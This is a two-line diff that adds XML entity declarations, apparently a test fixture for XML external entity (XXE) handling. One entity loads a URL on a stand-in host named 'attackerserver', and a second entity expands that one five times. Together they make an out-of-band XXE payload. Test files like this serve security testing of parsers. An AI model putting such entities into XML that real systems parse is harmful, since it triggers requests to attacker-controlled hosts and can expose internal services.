@@ -1,0 +1,2 @@
+<!ENTITY one SYSTEM "http://attackerserver:8888/doesnotexist" >
+<!ENTITY five "&one; &one; &one; &one; &one;" >
